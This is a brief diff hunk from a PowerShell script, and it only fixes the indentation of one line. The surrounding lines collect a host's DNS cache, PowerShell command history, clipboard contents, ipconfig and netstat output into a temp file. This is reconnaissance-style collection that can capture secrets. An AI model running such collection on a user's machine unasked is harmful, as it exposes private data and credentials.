@@ -322,7 +322,7 @@ param (
 		(Invoke-Sysinfo -PsVersion | out-file $env:temp\sysinfo.txt -Append)
 		(Invoke-Sysinfo -DnsCache | out-file $env:temp\sysinfo.txt -Append)
 		(Invoke-Sysinfo -PsHistory | out-file $env:temp\sysinfo.txt -Append)
-    	(Invoke-Sysinfo -ClipBoard | out-file $env:temp\sysinfo.txt -Append)
+		(Invoke-Sysinfo -ClipBoard | out-file $env:temp\sysinfo.txt -Append)
 		(Invoke-Sysinfo -IpConfig | out-file $env:temp\sysinfo.txt -Append)
 		(Invoke-Sysinfo -NetStat | out-file $env:temp\sysinfo.txt -Append)
     
